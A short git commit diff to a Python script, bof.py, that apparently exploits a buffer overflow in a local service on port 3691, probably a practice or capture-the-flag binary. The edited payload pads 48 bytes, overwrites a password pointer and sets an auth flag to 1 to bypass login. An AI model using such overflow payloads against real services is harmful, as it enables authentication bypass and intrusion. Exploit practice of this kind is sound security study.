7e176bd75380dd968030529228e67c6735c49fb6
Pistachio <pistachio.uss@gmail.com>
2016-08-31 18:56:35 +0700

    [+] edit bof.py

--- bof.py
+++ bof.py
@@ -6,9 +6,9 @@ from struct import pack
 s = socket.socket()
 s.connect(("127.0.0.1" ,3691))
 
-s.send("A" * 48  +
-        pack("<I", 0x0804a000) +
-        "A" * 8 
+s.send("A" * 48  +                  # input[48]
+        pack("<I", 0x0804a000) +    # *password
+        pack("<I", 0x1)             # auth
         + "\n")
 
 t = telnetlib.Telnet()
